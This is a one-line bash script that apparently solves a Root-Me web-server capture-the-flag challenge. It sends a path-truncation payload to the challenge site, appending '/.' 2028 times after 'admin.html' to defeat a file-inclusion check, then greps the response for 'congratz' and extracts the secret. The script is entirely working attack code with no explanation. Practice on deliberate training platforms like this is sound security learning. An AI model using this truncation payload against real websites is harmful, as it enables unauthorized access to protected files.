#!/bin/bash
curl -s  http://challenge01.root-me.org/web-serveur/ch35/?page=admin.html/$(python -c "print '/.'*2028,")|grep -i congratz|sed s/".*\s\(.*\)$"/"\1"/
